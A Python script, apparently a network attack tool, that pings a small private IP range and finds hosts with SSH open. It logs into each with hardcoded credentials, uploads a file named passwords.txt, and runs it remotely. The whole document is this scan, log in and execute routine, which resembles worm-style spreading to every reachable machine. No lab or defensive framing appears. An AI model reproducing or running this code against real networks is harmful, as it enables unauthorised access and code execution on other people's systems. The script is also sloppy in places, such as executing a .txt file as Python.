#!/usr/bin/env python3
# Scan Live SSH on IP Ranges - Conenct & Execute
# Author Yehia Elghaly

import os
import re
import time
import sys
import socket
import paramiko

USER = "psycho"
PASS = "Admin1234"

#Scan entire Range 
lifeline = re.compile(r"(\d) received")
report = ("No response","Partial Response","Alive")

for host in range(110,114):
   ip = "192.168.0."+str(host)
   pingaling = os.popen("ping -q -c2 "+ip,"r")
   print ("Testing ",ip,sys.stdout.flush())
   while 1:
      line = pingaling.readline()
      if not line: break
      igot = re.findall(lifeline,line)
      if igot:
         print (report[int(igot[0])])
         sock = socket.socket()
         sock.settimeout(0.5)
         #Connect Through SSH with provided Credentials 
         try:
            sock.connect((ip, 22))
            print ("SSH OPEN")
            client1=paramiko.SSHClient()
            client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client1.connect(ip,username=USER, password=PASS)
            print ("SSH connection to %s established" %ip)
            stdin, ssh_stdout, ssh_stderr = client1.exec_command('ls /tmp')
            print ("output", ssh_stdout.read())
            error = ssh_stderr.read()
            print ("!!", error, len(error))
            sftp = client1.open_sftp()
            sftp.put('passwords.txt', '/tmp/passwords.txt')
            stdin, ssh_stdout, ssh_stderr = client1.exec_command('python /tmp/passwords.txt')
            print ("output", ssh_stdout.read())
            sftp.close()
            client1.close()
         except socket.error:
            print ("Not A Live or SSH not Alive")